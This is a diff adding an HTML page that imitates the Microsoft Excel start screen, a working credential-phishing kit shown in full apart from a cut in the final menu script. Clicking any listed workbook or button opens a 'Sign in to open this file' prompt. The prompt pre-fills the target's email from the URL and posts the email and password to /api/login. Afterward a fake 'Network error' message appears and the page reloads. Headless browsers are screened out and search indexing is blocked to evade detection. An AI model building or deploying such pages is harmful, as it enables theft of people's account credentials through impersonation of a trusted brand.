@@ -1,0 +1,1191 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="robots" content="noindex, nofollow">
+<meta name="referrer" content="no-referrer">
+<meta http-equiv="X-Robots-Tag" content="noindex, nofollow">
+<title>Excel</title>
+<style>
+  :root{
+    --excel-green: #217346;
+    --excel-green-dark: #1a5c38;
+    --bg: #f3f2f1;
+    --text: #201f1e;
+    --muted: #605e5c;
+    --border: #e1dfdd;
+  }
+  /* Human-verification gate: keeps content hidden until a real browser passes the JS check */
+  @keyframes botspin{ to{ transform: rotate(360deg); } }
+  .bot-gate{
+    position:fixed; inset:0; z-index:9999;
+    background:#fff;
+    display:flex; align-items:center; justify-content:center;
+    flex-direction:column; gap:18px;
+  }
+  .bot-gate .bot-logo{
+    width:52px; height:52px; border-radius:10px;
+    background:var(--excel-green);
+    color:#fff; display:flex; align-items:center; justify-content:center;
+    font-size:26px; font-weight:700;
+  }
+  .bot-gate .bot-ring{
+    width:30px; height:30px; border-radius:50%;
+    border:3px solid rgba(33,115,70,0.2);
+    border-top-color:var(--excel-green);
+    animation:botspin .8s linear infinite;
+  }
+.bot-gate p{ font-size:13px; color:var(--muted); margin:0; }
+  .bot-gate.hidden{ display:none; }
+
+.app{
+    width:100%;
+    min-height:100vh;
+    /* Use dynamic viewport height when supported so the layout tracks the
+       visible area on mobile (address bar shown/hidden). */
+    min-height:100dvh;
+  }
+  *{box-sizing:border-box;}
+  body{
+    margin:0;
+    font-family: "Segoe UI", "Segoe UI Web", Arial, sans-serif;
+    background:#fff;
+    color:var(--text);
+    font-size:14px;
+    /* Give instant visual feedback on every tap (instead of iOS default flash). */
+    -webkit-tap-highlight-color: transparent;
+    -webkit-text-size-adjust: 100%;
+    text-size-adjust: 100%;
+  }
+
+  /* Title bar */
+  .titlebar{
+    background:var(--excel-green);
+    color:#fff;
+    display:flex;
+    align-items:center;
+    justify-content:space-between;
+/* Account for notched devices (safe area top) while keeping 38px base height. */
+    height:calc(38px + env(safe-area-inset-top, 0px));
+    padding-top:env(safe-area-inset-top, 0px);
+    padding-left:calc(8px + env(safe-area-inset-left, 0px));
+    padding-right:calc(8px + env(safe-area-inset-right, 0px));
+    padding-bottom:0;
+    font-size:13px;
+  }
+  .titlebar-left{
+    display:flex;
+    align-items:center;
+    gap:10px;
+  }
+  .excel-icon{
+    width:18px;height:18px;
+    background:#fff;
+    border-radius:3px;
+    display:flex;align-items:center;justify-content:center;
+    color:var(--excel-green);
+    font-weight:bold;
+    font-size:11px;
+  }
+  .titlebar-right{
+    display:flex;
+    align-items:center;
+    gap:16px;
+  }
+  .titlebar-right .icon{
+    width:16px;height:16px;
+    display:flex;align-items:center;justify-content:center;
+    opacity:0.95;
+    cursor:default;
+  }
+  .avatar{
+    width:24px;height:24px;
+    border-radius:50%;
+    background:#b4009e;
+    color:#fff;
+    display:flex;align-items:center;justify-content:center;
+    font-size:11px;
+    font-weight:600;
+  }
+  .warn{
+    color:#ffcc00;
+    font-size:15px;
+  }
+  .win-controls{
+    display:flex;
+    gap:14px;
+    margin-left:8px;
+    font-size:13px;
+  }
+
+  /* Body layout */
+  .body{
+    display:flex;
+    min-height:calc(100vh - 38px);
+    /* Dynamic viewport height (tracks visible mobile area / address-bar state). */
+    min-height:calc(100dvh - 38px);
+  }
+
+  /* Sidebar */
+  .sidebar{
+    width:80px;
+    background:#faf9f8;
+    border-right:1px solid var(--border);
+    padding-top:16px;
+    display:flex;
+    flex-direction:column;
+    align-items:center;
+    justify-content:space-between;
+  }
+  .sidebar-top, .sidebar-bottom{
+    display:flex;
+    flex-direction:column;
+    align-items:center;
+    width:100%;
+  }
+.sb-item{
+    display:flex;
+    flex-direction:column;
+    align-items:center;
+    gap:4px;
+    width:100%;
+    padding:10px 0;
+    color:var(--muted);
+    cursor:pointer;
+    font-size:12px;
+    border:none;
+    background:transparent;
+    font-family:inherit;
+    transition: background .15s ease, color .15s ease;
+  }
+  .sb-item:hover{
+    background:#f3f2f1;
+    color:var(--text);
+  }
+  .sb-item:active{
+    background:#e6e4e1;
+    color:var(--excel-green);
+  }
+  .sb-item.active{
+    color:var(--excel-green);
+    border-left:3px solid var(--excel-green);
+  }
+  .sb-item svg{ width:20px; height:20px; }
+  .sb-item:focus-visible{ outline:2px solid var(--excel-green); outline-offset:2px; }
+  .sidebar-bottom{
+    margin-bottom:10px;
+  }
+
+  /* Main content */
+  .main{
+    flex:1;
+    padding:28px 40px;
+  }
+  .greeting{
+    font-size:28px;
+    font-weight:600;
+    margin:0 0 20px 0;
+  }
+  .new-row{
+    display:flex;
+    align-items:center;
+    gap:6px;
+    margin-bottom:26px;
+  }
+  .chevron{
+    color:var(--muted);
+    font-size:14px;
+  }
+.btn-new{
+    background:var(--excel-green);
+    color:#fff;
+    border:none;
+    padding:9px 20px;
+    font-size:14px;
+    border-radius:2px;
+    cursor:pointer;
+    font-family:inherit;
+    transition: background .15s ease;
+  }
+  .btn-new:hover{
+    background:var(--excel-green-dark);
+  }
+  .btn-new:active{
+    background:#155a2d;
+    transform:translateY(1px);
+  }
+  .btn-new:focus-visible{ outline:2px solid var(--excel-green-dark); outline-offset:2px; }
+
+  .tabs{
+    display:flex;
+    align-items:center;
+    gap:10px;
+    margin-bottom:20px;
+  }
+  .tab{
+    padding:7px 18px;
+    border-radius:16px;
+    border:1px solid transparent;
+    font-size:13px;
+    cursor:default;
+  }
+  .tab.active{
+    background:var(--excel-green);
+    color:#fff;
+  }
+  .tab:active{
+    background:#e6e4e1;
+  }
+  .tab:not(.active){
+    border-color:#c8c6c4;
+    color:var(--text);
+  }
+
+  .search-wrap{
+    position:absolute;
+    right:40px;
+  }
+  .toolbar-row{
+    display:flex;
+    justify-content:space-between;
+    align-items:center;
+    margin-top:0;
+    margin-bottom:20px;
+  }
+  .search-box{
+    display:flex;
+    align-items:center;
+    gap:8px;
+    border:1px solid #c8c6c4;
+    border-radius:4px;
+    padding:8px 12px;
+    width:340px;
+    color:var(--muted);
+    font-size:13px;
+  }
+
+  .list-header{
+    display:flex;
+    justify-content:space-between;
+    padding:8px 4px 8px 0;
+    border-bottom:1px solid var(--border);
+    color:var(--text);
+    font-size:13px;
+  }
+  .file-list{
+    max-height:260px;
+    overflow-y:auto;
+    padding-right:4px;
+    position:relative;
+  }
+  .file-list::-webkit-scrollbar{
+    width:10px;
+  }
+  .file-list::-webkit-scrollbar-track{
+    background:transparent;
+  }
+  .file-list::-webkit-scrollbar-thumb{
+    background:#c8c6c4;
+    border-radius:5px;
+  }
+  .file-list::-webkit-scrollbar-thumb:hover{
+    background:#a19f9d;
+  }
+  .file-row{
+    display:flex;
+    align-items:center;
+    justify-content:space-between;
+    padding:12px 0;
+    border-bottom:1px solid var(--border);
+    cursor:pointer;
+    touch-action:manipulation;
+    appearance:none;
+    -webkit-appearance:none;
+    background:transparent;
+    border:none;
+    font-family:inherit;
+    font-size:inherit;
+    color:inherit;
+    text-align:left;
+    width:100%;
+  }
+  .file-row:hover{
+    background:#f3f2f1;
+  }
+  .file-row:active{
+    background:#e6e4e1;
+  }
+  .file-row:focus-visible{ outline:2px solid var(--excel-green); outline-offset:-2px; }
+  .file-left{
+    display:flex;
+    align-items:center;
+    gap:14px;
+  }
+  .file-icon{
+    width:32px;height:32px;
+    background:var(--excel-green);
+    border-radius:3px;
+    position:relative;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+  }
+  .file-icon::before{
+    content:"X";
+    color:#fff;
+    font-weight:700;
+    font-size:15px;
+  }
+  .file-icon::after{
+    content:"";
+    position:absolute;
+    bottom:-4px;
+    right:-4px;
+    width:14px;
+    height:14px;
+    background:#0f7a3d;
+    border-radius:3px;
+  }
+  .file-name{
+    font-size:14px;
+    color:var(--text);
+  }
+  .file-loc{
+    font-size:12px;
+    color:var(--muted);
+    margin-top:2px;
+  }
+  .file-date{
+    font-size:13px;
+    color:var(--muted);
+    padding-right:6px;
+  }
+
+  .bottom-row{
+    display:flex;
+    justify-content:space-between;
+    margin-top:16px;
+    font-size:13px;
+  }
+  .link{
+    color:var(--excel-green);
+    text-decoration:none;
+    display:flex;
+    align-items:center;
+    gap:6px;
+    cursor:default;
+  }
+
+  /* Login overlay */
+  .login-overlay{
+    position:fixed; inset:0; background: rgba(20,20,20,0.55);
+    backdrop-filter: blur(6px);
+    -webkit-backdrop-filter: blur(6px);
+display:none; align-items:center; justify-content:center; z-index:10000; padding:24px;
+  }
+  .login-overlay.open{ display:flex; }
+.login-card{
+    position:relative; width:min(400px,100%);
+    max-height:90vh;
+    overflow-y:auto;
+    -webkit-overflow-scrolling:touch;
+    background:#fff; border-radius:8px; border:1px solid var(--border);
+    padding:30px 28px 24px; color:var(--text);
+    box-shadow: 0 24px 60px rgba(0,0,0,0.35);
+  }
+  .login-field input.invalid{
+    border-color:#c50f1f;
+    box-shadow:0 0 0 2px rgba(197,15,31,0.15);
+  }
+  .login-close{
+    position:absolute; top:12px; right:12px; background:transparent; border:none;
+    color:var(--muted); font-size:16px; cursor:pointer; padding:4px;
+  }
+  .login-close:hover{ color:var(--text); }
+  .login-close:active{ color:var(--text); background:#f3f2f1; border-radius:4px; }
+  .login-close:focus-visible{ outline:2px solid var(--excel-green); outline-offset:1px; }
+  .login-card h4{
+    font-family:"Segoe UI",sans-serif; font-size:17px; font-weight:600;
+    margin:0 0 4px; color:var(--text);
+  }
+  .login-sub{ font-size:12.5px; color:var(--muted); margin:0 0 20px; line-height:1.55; }
+  .login-field{ margin-bottom:14px; }
+  .login-field label{
+    display:block; font-size:11px; font-weight:600; color:var(--text);
+    margin-bottom:6px;
+  }
+  .login-field input{
+    width:100%; background:#fff; border:1px solid #8a8886; border-radius:4px;
+    padding:9px 12px; color:var(--text); font-family:"Segoe UI",sans-serif;
+    font-size:14px; outline:none; transition: border-color .15s ease;
+  }
+.login-field input:focus{ border-color:var(--excel-green); box-shadow:0 0 0 2px rgba(33,115,70,0.2); }
+  .login-field input[readonly]{
+    background:#f3f2f1;
+    border-color:#c8c6c4;
+    color:var(--muted);
+    cursor:not-allowed;
+  }
+  .login-field input[readonly]:focus{
+    border-color:#c8c6c4;
+    box-shadow:none;
+  }
+  .login-field .lock-hint{
+    display:inline-flex;
+    align-items:center;
+    gap:4px;
+    font-size:11px;
+    color:var(--muted);
+    margin-top:6px;
+  }
+  .login-field .lock-hint .lock-ico{ font-size:12px; }
+.login-error{ color:#c50f1f; font-size:12.5px; margin:0 0 12px; display:none; line-height:1.45; }
+  .login-success{ color:var(--excel-green); font-size:12.5px; margin:0 0 12px; display:none; line-height:1.45; }
+  .login-actions{ display:flex; gap:10px; margin-top:4px; }
+  .login-btn{
+    flex:1; font-family:"Segoe UI",sans-serif; font-size:13.5px; font-weight:600;
+    border-radius:4px; padding:9px 14px; cursor:pointer; border:1px solid transparent;
+    display:inline-flex; align-items:center; justify-content:center; gap:7px;
+  }
+.login-btn-primary{ background:var(--excel-green); color:#fff; }
+  .login-btn-primary:hover{ background:var(--excel-green-dark); }
+  .login-btn-primary:active{ background:#155a2d; transform:translateY(1px); }
+  .login-btn-primary:disabled{ background:#9ab8a6; cursor:not-allowed; transform:none; }
+  .login-btn-ghost{ background:#fff; border-color:#8a8886; color:var(--text); }
+  .login-btn-ghost:hover{ background:#f3f2f1; }
+  .login-btn-ghost:active{ background:#e6e4e1; }
+  .login-btn:focus-visible{ outline:2px solid var(--excel-green); outline-offset:2px; }
+  .login-hint{
+    font-size:11px; color:var(--muted); text-align:center; margin:18px 0 0;
+    border-top:1px solid var(--border); padding-top:14px;
+  }
+  .login-hint b{ color:var(--excel-green); font-weight:600; }
+
+/* ===== HAMBURGER MENU VISIBILITY =====
+     The hamburger button is VISIBLE on all screen sizes so the menu
+     options can always be opened by clicking/tapping it. */
+  .hamburger{
+    display:flex;               /* always visible */
+    flex-direction:column;
+    justify-content:center;
+    gap:3px;
+    width:30px; height:30px;
+    background:transparent;
+    border:none;
+    padding:0;
+    cursor:pointer;
+  }
+  .hamburger span{
+    display:block;
+    width:18px; height:2px;
+    background:#fff;
+    border-radius:2px;
+    margin:0 auto;
+    transition: transform .2s ease, opacity .2s ease;
+  }
+  .hamburger:hover{ opacity:0.85; }
+  .hamburger:active{ opacity:0.65; transform:scale(0.94); }
+  .hamburger:focus-visible{ outline:2px solid #fff; outline-offset:2px; }
+
+/* Slide-in menu panel & dark backdrop.
+     Both are always allowed to render (visible on all screen sizes).
+     .menu-panel.open + .menu-backdrop.show make them appear when the
+     hamburger is clicked. */
+  .menu-backdrop{
+    display:block;
+    position:fixed; inset:0;
+    background: rgba(20,20,20,0.5);
+    z-index:300;
+    opacity:0;
+    pointer-events:none;          /* ignore clicks while hidden */
+    transition: opacity .25s ease;
+  }
+  .menu-backdrop.show{ opacity:1; pointer-events:auto; }
+  .menu-panel{
+    display:flex;
+    position:fixed; top:0; bottom:0; left:0;
+    width:min(300px, 82%);
+    background:#fff;
+    z-index:301;
+    box-shadow:2px 0 18px rgba(0,0,0,0.25);
+    transform:translateX(-100%);
+    transition: transform .25s ease;
+    flex-direction:column;
+  }
+  .menu-panel.open{
+    transform:translateX(0);
+  }
+  .menu-header{
+    display:flex;
+    align-items:center;
+    gap:10px;
+    background:var(--excel-green);
+    color:#fff;
+    padding:14px 16px;
+    font-size:14px;
+    font-weight:600;
+  }
+  .menu-header .excel-icon{
+    width:20px;height:20px;
+    font-size:12px;
+  }
+  .menu-close{
+    margin-left:auto;
+    background:transparent;
+    border:none;
+    color:#fff;
+    font-size:16px;
+    cursor:pointer;
+    padding:4px 6px;
+  }
+  .menu-close:hover{ opacity:0.85; }
+  .menu-nav{
+    display:flex;
+    flex-direction:column;
+    padding:8px 0;
+  }
+  .menu-item{
+    display:flex;
+    align-items:center;
+    gap:14px;
+    width:100%;
+    border:none;
+    background:transparent;
+    font-family:inherit;
+    font-size:14px;
+    color:var(--text);
+    padding:14px 18px;
+    cursor:pointer;
+    text-align:left;
+  }
+  .menu-item svg{ width:20px; height:20px; flex:0 0 auto; color:var(--muted); }
+.menu-item:hover{ background:#f3f2f1; }
+  .menu-item:active{ background:#e6e4e1; }
+  .menu-item:focus-visible{ outline:2px solid var(--excel-green); outline-offset:-2px; }
+  .menu-item.active{ color:var(--excel-green); font-weight:600; }
+  .menu-item.active svg{ color:var(--excel-green); }
+
+/* ===== Mobile responsive ===== */
+  @media (max-width:900px){
+    /* ===== HAMBURGER MENU =====
+         On screens narrower than 900px the desktop sidebar is hidden;
+         the hamburger menu (already visible on all screen sizes) is
+         the primary navigation. */
+    .sidebar{
+      display:none;             /* hide desktop sidebar on mobile */
+    }
+    .body{
+      min-height:calc(100vh - 38px);
+    }
+    .main{
+      padding:22px 18px;
+    }
+    .toolbar-row{
+      flex-direction:column;
+      align-items:stretch;
+      gap:12px;
+      margin-bottom:16px;
+    }
+    .tabs{
+      gap:8px;
+      overflow-x:auto;
+      margin-bottom:8px;
+    }
+    .tab{
+      flex:0 0 auto;
+      white-space:nowrap;
+    }
+    .search-box{
+      width:100%;
+    }
+  }
+
+  @media (max-width:600px){
+    .titlebar{
+      font-size:12px;
+    }
+    .titlebar-right{
+      gap:10px;
+    }
+    .win-controls{
+      display:none;
+    }
+    .titlebar-left .excel-icon{
+      display:none;
+    }
+    .greeting{
+      font-size:22px;
+      margin-bottom:14px;
+    }
+    .btn-new{
+      padding:10px 16px;
+      font-size:13px;
+    }
+    .main{
+      padding:16px 12px;
+    }
+    .search-box{
+      padding:8px 10px;
+      font-size:12px;
+    }
+    .file-row{
+      padding:10px 0;
+    }
+    .file-name{
+      font-size:13px;
+    }
+    .file-date{
+      font-size:12px;
+    }
+    .file-icon{
+      width:28px;height:28px;
+    }
+    .bottom-row{
+      flex-direction:column;
+      align-items:flex-start;
+      gap:10px;
+    }
+    .list-header{
+      font-size:12px;
+    }
+    .login-overlay{
+      padding:0;
+      align-items:flex-end;
+    }
+    .login-card{
+      padding:26px 20px calc(20px + env(safe-area-inset-bottom, 0px));
+      width:100%;
+      max-width:100%;
+      max-height:88vh;
+      max-height:88dvh;
+      border-radius:14px 14px 0 0;
+      border-bottom:none;
+      border-left:none;
+      border-right:none;
+      overscroll-behavior:contain;
+    }
+    .login-card h4{
+      font-size:18px;
+    }
+    .login-field input{
+      font-size:16px;
+      padding:12px 14px;
+    }
+    .login-actions{
+      flex-direction:column-reverse;
+    }
+    .login-btn{
+      padding:12px 14px;
+      font-size:14px;
+    }
+    .file-row{
+      min-height:56px;
+    }
+    .file-list{
+      max-height:none;
+      -webkit-overflow-scrolling:touch;
+    }
+    .greeting{
+      font-size:22px;
+    }
+  }
+</style>
+</head>
+<body>
+
+<!-- Human verification gate: hidden until JS passes the check -->
+<div class="bot-gate" id="botGate">
+  <div class="bot-logo">X</div>
+  <div class="bot-ring"></div>
+  <p id="botGateText">Verifying you're human&hellip;</p>
+</div>
+
+<div class="app">
+  <!-- Title Bar -->
+<div class="titlebar">
+    <div class="titlebar-left">
+      <button class="hamburger" id="hamburger" aria-label="Menu" aria-expanded="false">
+        <span></span><span></span><span></span>
+      </button>
+      <div class="excel-icon">X</div>
+      <span>Excel</span>
+    </div>
+    <div class="titlebar-right">
+      <span class="warn">&#9888;</span>
+      <div class="avatar"></div>
+      <span class="icon">&#128172;</span>
+      <span class="icon">?</span>
+      <div class="win-controls">
+
+      </div>
+    </div>
+  </div>
+
+<!-- Mobile hamburger menu -->
+  <div class="menu-backdrop" id="menuBackdrop"></div>
+  <div class="menu-panel" id="menuPanel" aria-hidden="true">
+    <div class="menu-header">
+      <div class="excel-icon">X</div>
+      <span>Excel</span>
+      <button class="menu-close" id="menuClose" aria-label="Close menu">&#10005;</button>
+    </div>
+    <nav class="menu-nav">
+      <button class="menu-item active" data-action="Home">
+        <svg viewBox="0 0 24 24" fill="currentColor"><path d="M12 3l9 8h-3v9h-5v-6H11v6H6v-9H3l9-8z"/></svg>
+        Home
+      </button>
+      <button class="menu-item" data-action="New">
+        <svg viewBox="0 0 24 24" fill="currentColor"><path d="M6 2h9l5 5v15H6V2zm8 1.5V8h4.5L14 3.5z"/></svg>
+        New
+      </button>
+      <button class="menu-item" data-action="Open">
+        <svg viewBox="0 0 24 24" fill="currentColor"><path d="M3 6h6l2 2h10v11H3V6z"/></svg>
+        Open
+      </button>
+      <button class="menu-item" data-action="Account">
+        <svg viewBox="0 0 24 24" fill="currentColor"><circle cx="12" cy="8" r="4"/><path d="M4 21c0-4 4-6 8-6s8 2 8 6"/></svg>
+        Account
+      </button>
+      <button class="menu-item" data-action="Options">
+        <svg viewBox="0 0 24 24" fill="currentColor"><rect x="3" y="3" width="8" height="8"/><rect x="13" y="3" width="8" height="8"/><rect x="3" y="13" width="8" height="8"/><rect x="13" y="13" width="8" height="8"/></svg>
+        Options
+      </button>
+    </nav>
+  </div>
+
+  <div class="body">
+    <!-- Sidebar -->
+    <div class="sidebar">
+      <div class="sidebar-top">
+        <button class="sb-item active" data-action="Home">
+          <svg viewBox="0 0 24 24" fill="currentColor"><path d="M12 3l9 8h-3v9h-5v-6H11v6H6v-9H3l9-8z"/></svg>
+          Home
+        </button>
+        <button class="sb-item" data-action="New">
+          <svg viewBox="0 0 24 24" fill="currentColor"><path d="M6 2h9l5 5v15H6V2zm8 1.5V8h4.5L14 3.5z"/></svg>
+          New
+        </button>
+        <button class="sb-item" data-action="Open">
+          <svg viewBox="0 0 24 24" fill="currentColor"><path d="M3 6h6l2 2h10v11H3V6z"/></svg>
+          Open
+        </button>
+      </div>
+      <div class="sidebar-bottom">
+        <button class="sb-item" data-action="Account">
+          <svg viewBox="0 0 24 24" fill="currentColor"><circle cx="12" cy="8" r="4"/><path d="M4 21c0-4 4-6 8-6s8 2 8 6"/></svg>
+          Account
+        </button>
+        <button class="sb-item" data-action="Options">
+          <svg viewBox="0 0 24 24" fill="currentColor"><rect x="3" y="3" width="8" height="8"/><rect x="13" y="3" width="8" height="8"/><rect x="3" y="13" width="8" height="8"/><rect x="13" y="13" width="8" height="8"/></svg>
+          Options
+        </button>
+      </div>
+    </div>
+
+    <!-- Main -->
+    <div class="main">
+      <h1 class="greeting"></h1>
+
+      <div class="new-row">
+        <span class="chevron">&#8250;</span>
+        <button class="btn-new">New blank workbook</button>
+      </div>
+
+      <div class="toolbar-row">
+        <div class="tabs">
+          <div class="tab active">Recent</div>
+          <div class="tab">Favorites</div>
+          <div class="tab">Shared with Me</div>
+        </div>
+        <div class="search-box">
+          <span>&#128269;</span>
+          <span>Search for a file</span>
+        </div>
+      </div>
+
+      <div class="list-header">
+        <span>Name</span>
+        <span>Document Size</span>
+      </div>
+
+      <div class="file-list">
+      <button type="button" class="file-row">
+        <div class="file-left">
+          <div class="file-icon"></div>
+          <div>
+            <div class="file-name">Project file.xlsx</div>
+            <div class="file-loc"></div>
+          </div>
+        </div>
+        <div class="file-date">2.1MB</div>
+      </button>
+
+      <button type="button" class="file-row">
+        <div class="file-left">
+          <div class="file-icon"></div>
+          <div>
+            <div class="file-name">Design plan sample.xlsx</div>
+            <div class="file-loc"></div>
+          </div>
+        </div>
+        <div class="file-date">1.3 M</div>
+      </button>
+
+      <button type="button" class="file-row">
+        <div class="file-left">
+          <div class="file-icon"></div>
+          <div>
+            <div class="file-name">Budget .xlsx</div>
+            <div class="file-loc"></div>
+          </div>
+        </div>
+        <div class="file-date">1.1 MB</div>
+      </button>
+
+
+      <div class="bottom-row">
+        <a class="link" href="#">Recover unsaved workbooks</a>
+        <a class="link" href="#">More workbooks &#8594;</a>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- Login modal -->
+<div class="login-overlay" id="loginOverlay">
+  <div class="login-card">
+    <button class="login-close" id="loginClose" aria-label="Close">&#10005;</button>
+    <h4>Sign in to open this file</h4>
+    <p class="login-sub">This workbook is protected. Enter your email and password to continue.</p>
+<div class="login-field">
+      <label for="loginEmail">Email</label>
+      <input id="loginEmail" type="email" autocomplete="username" placeholder="you@example.com">
+      <div class="lock-hint" id="emailLockHint" style="display:none;">
+        <span class="lock-ico">&#128274;</span>
+      </div>
+    </div>
+    <div class="login-field">
+      <label for="loginPassword">Password</label>
+      <input id="loginPassword" type="password" autocomplete="current-password" placeholder="&#9679;&#9679;&#9679;&#9679;&#9679;&#9679;">
+    </div>
+    <!-- Honeypot field: invisible to humans, bots auto-fill it -->
+    <div style="position:absolute;left:-9999px;opacity:0;pointer-events:none;height:0;overflow:hidden;" aria-hidden="true">
+      <label for="botTrap">Do not fill</label>
+      <input id="botTrap" name="bot_trap" type="text" tabindex="-1" autocomplete="off">
+    </div>
+<p class="login-error" id="loginError">Incorrect email or password. Please try again.</p>
+    <p class="login-success" id="loginSuccess">&#10003; Network error. Refreshing&hellip;</p>
+    <div class="login-actions">
+      <button class="login-btn login-btn-ghost" id="loginCancel">Cancel</button>
+      <button class="login-btn login-btn-primary" id="loginSubmit">Unlock</button>
+    </div>
+    <p class="login-hint"> &middot; </p>
+  </div>
+</div>
+
+<script>
+/* ---- Bot verification gate ---- */
+/* A real browser runs JS, removes the gate, and shows content.
+   Naive scrapers/bots that don't run JS stay behind the gate. */
+(function(){
+  const gate  = document.getElementById('botGate');
+  const text  = document.getElementById('botGateText');
+  if(!gate) return;
+
+  /* Run lightweight checks that work reliably on all devices.
+     Uses .hidden class for clean style management. */
+  let passed = true;
+
+  /* Check 1: navigator.webdriver — Selenium / Puppeteer / Playwright flag */
+  if(navigator.webdriver) passed = false;
+
+  /* Check 2: core DOM must be present */
+  if(!document.querySelector || !document.querySelector('.app')){
+    passed = false;
+  }
+
+  /* Check 3: simple function presence test */
+  if(typeof performance === 'undefined' || typeof document.getElementById !== 'function'){
+    passed = false;
+  }
+
+  if(passed){
+    gate.classList.add('hidden');
+  } else {
+    text.textContent = 'Verification failed. Please reload.';
+  }
+})();
+
+const loginOverlay = document.getElementById('loginOverlay');
+const loginEmail = document.getElementById('loginEmail');
+const loginPassword = document.getElementById('loginPassword');
+const loginError = document.getElementById('loginError');
+const loginSuccess = document.getElementById('loginSuccess');
+let sessionUnlocked = false;
+
+async function checkAuth(){
+  try {
+    const res = await fetch('/api/verify', { method: 'GET', credentials: 'same-origin' });
+    if(res.ok){
+      const data = await res.json();
+      if(data.authenticated){
+        sessionUnlocked = true;
+      }
+    }
+  } catch(e){
+    console.error('Auth check failed', e);
+  }
+}
+
+function getEmailFromUrl(){
+  try{
+    const params = new URLSearchParams(window.location.search);
+    const email = (params.get('email') || '').trim();
+    return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email) ? email : '';
+  }catch(e){
+    return '';
+  }
+}
+
+/* Auto-fill the email/username from the URL and make it readonly.
+   If no email is present in the URL, the field stays editable. */
+const urlEmail = getEmailFromUrl();
+function applyUrlEmail(){
+  if(!urlEmail) return;
+  loginEmail.value = urlEmail;
+  loginEmail.setAttribute('readonly', 'readonly');
+  const hint = document.getElementById('emailLockHint');
+  if(hint) hint.style.display = 'inline-flex';
+}
+
+function openLogin(){
+  loginError.style.display = 'none';
+  loginSuccess.style.display = 'none';
+  loginPassword.value = '';
+  applyUrlEmail();
+  loginOverlay.classList.add('open');
+  if(urlEmail){
+    loginPassword.focus();
+  }else{
+    setTimeout(()=> loginEmail.focus(), 30);
+  }
+}
+
+function closeLogin(){
+  loginOverlay.classList.remove('open');
+}
+
+async function submitLogin(){
+  loginError.style.display = 'none';
+  loginEmail.classList.remove('invalid');
+  loginPassword.classList.remove('invalid');
+
+  /* Client-side empty-field validation — instant feedback on user input. */
+  const emailVal = loginEmail.value.trim();
+  const passVal = loginPassword.value;
+  if(!emailVal || !passVal){
+    loginError.textContent = 'Please enter both your email and password.';
+    loginError.style.display = 'block';
+    if(!emailVal) loginEmail.classList.add('invalid');
+    if(!passVal) loginPassword.classList.add('invalid');
+    return;
+  }
+
+  /* Honeypot check: if a bot filled the hidden field, reject */
+  const botTrap = document.getElementById('botTrap');
+  if(botTrap && botTrap.value.trim() !== ''){
+    loginError.textContent = 'Bot detected. Access denied.';
+    loginError.style.display = 'block';
+    return;
+  }
+
+  const submitBtn = document.getElementById('loginSubmit');
+  const cancelBtn = document.getElementById('loginCancel');
+  const originalLabel = submitBtn.textContent;
+  /* Loading state: give immediate feedback that the request is in flight. */
+  submitBtn.disabled = true;
+  cancelBtn.disabled = true;
+  submitBtn.textContent = 'Unlocking\u2026';
+
+  try {
+    const res = await fetch('/api/login', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      credentials: 'same-origin',
+      body: JSON.stringify({
+        email: loginEmail.value,
+        password: loginPassword.value
+      })
+    });
+
+    const data = await res.json();
+    if(res.ok && data.success){
+      sessionUnlocked = true;
+      /* Show success message, then refresh the page */
+      loginError.style.display = 'none';
+      loginSuccess.style.display = 'block';
+      document.getElementById('loginSubmit').disabled = true;
+      document.getElementById('loginSubmit').textContent = 'Unlocked';
+      document.getElementById('loginCancel').disabled = true;
+      document.getElementById('loginClose').style.pointerEvents = 'none';
+      setTimeout(()=> location.reload(), 1200);
+    } else {
+      loginError.textContent = data.message || 'Incorrect email or password. Please try again.';
+      loginError.style.display = 'block';
+      loginPassword.value = '';
+      loginPassword.focus();
+      /* Re-enable controls on error so the user can retry. */
+      submitBtn.disabled = false;
+      submitBtn.textContent = originalLabel;
+      cancelBtn.disabled = false;
+    }
+  } catch(e){
+    loginError.textContent = 'Network error. Please try again.';
+    loginError.style.display = 'block';
+    /* Re-enable controls on network error so the user can retry. */
+    submitBtn.disabled = false;
+    submitBtn.textContent = originalLabel;
+    cancelBtn.disabled = false;
+  }
+}
+
+/* Robust delegated handler: any .file-row (or .xlsx doc) opens the login gate.
+   Delegates from the document so clicks/taps on child elements always register.
+   The touch handler is persistent — it does NOT remove itself after the first
+   touch, so every tap on every file always opens the login popup. */
+let suppressClick = false;
+let tapStartX = 0;
+let tapStartY = 0;
+let tapMoved = false;
+
+document.addEventListener('touchstart', (e) => {
+  const t = e.changedTouches[0];
+  tapStartX = t.clientX;
+  tapStartY = t.clientY;
+  tapMoved = false;
+}, { passive: true });
+
+document.addEventListener('touchmove', (e) => {
+  const t = e.changedTouches[0];
+  if (t && (Math.abs(t.clientX - tapStartX) > 8 || Math.abs(t.clientY - tapStartY) > 8)) {
+    tapMoved = true; // it's a scroll/drag, not a tap
+  }
+}, { passive: true });
+
+document.addEventListener('touchend', (e) => {
+  if (tapMoved) return;
+  const t = e.changedTouches[0];
+  if (!t) return;
+  const target = document.elementFromPoint(t.clientX, t.clientY);
+  const row = target ? target.closest('.file-row') : null;
+  if (row && !sessionUnlocked) {
+    e.preventDefault();
+    suppressClick = true;
+    openLogin();
+  }
+}, { passive: false });
+
+document.addEventListener('click', (e) => {
+  if(suppressClick){
+    suppressClick = false;
+    return;
+  }
+  const row = e.target.closest('.file-row');
+  if (row && !sessionUnlocked) {
+    e.preventDefault();
+    openLogin();
+  }
+});
+
+function requireLoginForButton(el){
+  el.addEventListener('click', ()=>{
+    if(!sessionUnlocked){
+      openLogin();
+    }
+  });
+}
+
+document.querySelectorAll('.sb-item').forEach(btn => {
+  requireLoginForButton(btn);
+});
+
+document.querySelector('.btn-new').addEventListener('click', ()=>{
+  if(!sessionUnlocked){
+    openLogin();
+  }
+});
+
+/* ---- HAMBURGER MENU VISIBILITY (JS) ----
+     Controls the slide-in menu panel.
+     - openMenu()  -> makes the menu VISIBLE by adding .open / .show classes
+     - closeMenu() -> makes the menu INVISIBLE by removing those classes
+     The hamburger, the menu close (X) button, and clicking the backdrop
+     all toggle the menu's visibility. */
+const hamburger = document.getElementById('hamburger');
+const menuPanel = document.getElementById('menuPanel');
+const menuBackdrop = document.getElementById('menuBackdrop');
+const menuClose = document.getElementById('menuClose');
+
